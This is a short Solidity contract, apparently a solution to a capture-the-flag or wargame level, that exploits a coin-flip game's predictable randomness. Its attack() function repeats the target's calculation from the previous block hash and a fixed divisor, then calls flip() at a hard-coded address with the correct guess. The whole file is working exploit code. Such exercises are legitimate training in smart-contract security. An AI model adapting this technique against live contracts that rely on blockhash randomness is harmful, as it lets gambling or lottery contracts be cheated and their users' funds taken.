// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Level3 {
    address addr = 0xd7ef7D5c0C55914eabA7e7f5aF27FA89Cd292b17;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        (bool b,) = address(addr).call(abi.encodeWithSignature("flip(bool)", side));
        require(b);
    }
}
